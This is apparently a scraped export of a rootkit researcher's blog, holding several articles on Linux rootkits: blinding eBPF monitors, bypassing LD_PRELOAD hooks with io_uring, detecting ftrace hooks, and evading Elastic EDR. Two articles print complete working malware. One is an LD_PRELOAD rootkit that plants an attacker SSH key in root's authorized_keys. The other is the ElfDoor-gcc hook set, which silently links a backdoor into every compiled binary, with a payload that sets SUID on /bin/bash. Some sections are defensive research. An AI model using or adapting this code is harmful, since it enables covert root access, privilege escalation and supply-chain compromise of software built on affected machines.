tracepoints and execute as designed. However, every event they generate passes through our hooked ringbuffer functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And several other things.\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nBPF Iterators Can Be Filtered: Tools like GhostScan and Decloaker that enumerate kernel objects can be defeated by hooking bpf_iter_run_prog()\nRingbuffers Can Be Intercepted: Falco and Tracee\u0026rsquo;s event streams can be selectively filtered by hooking ringbuffer operations\nPerf Events Can Be Blocked: Legacy monitoring tools using perf events are equally vulnerable\nBPF Maps Can Be Manipulated: Security tools that track state in BPF maps can operate on incomplete data\nFtrace Enables Invisible Hooks: Hooking via ftrace allows interception without modifying kernel code or using obvious techniques like syscall table hooking\nTechnical Achievements:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques. The fundamental truth remains: the moment an attacker controls the kernel, they control reality as the system sees it.\nThe only winning move is not to let them get there.\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security has evolved dramatically. eBPF-based security solutions like Falco, Tracee, Tetragon, and others promised a new era of kernel-level observability that would make rootkits obsolete. The premise was compelling: if you can see everything happening in the kernel, attackers have nowhere to hide.\u003c/p\u003e\n\u003cp\u003eThat premise was wrong.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how a kernel module with root privileges can systematically blind eBPF security tools by hooking the very mechanisms they rely on for observability. We present a comprehensive analysis of how modern rootkits can intercept BPF iterators, ringbuffers, perf events, and map operations to become completely invisible to runtime security monitoring.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The 